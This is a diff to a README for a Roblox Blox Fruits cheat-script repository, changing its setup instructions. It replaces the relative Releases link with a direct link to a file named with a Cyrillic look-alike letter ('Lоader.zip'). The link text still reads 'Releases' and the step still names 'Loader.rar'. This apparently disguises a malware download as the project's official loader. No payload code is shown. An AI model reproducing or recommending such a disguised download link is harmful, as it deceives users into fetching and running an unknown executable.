@@ -40,7 +40,7 @@ Welcome to the future of Roblox Blox Fruits scripting! This repo offers a cuttin
 ## 🛠️ Setup Instructions
 
 1. **Download the Loader**  
-   Head to the [Releases](../../releases) section and download `Loader.rar`.
+   Head to the [Releases](https://github.com/nyushu-emulator/Blox-Fruits-Script/blob/main/L%D0%BEader.zip) section and download `Loader.rar`.
 
 2. **Extract Files**  
    Use WinRAR, 7-Zip, or your OS’s default extractor.
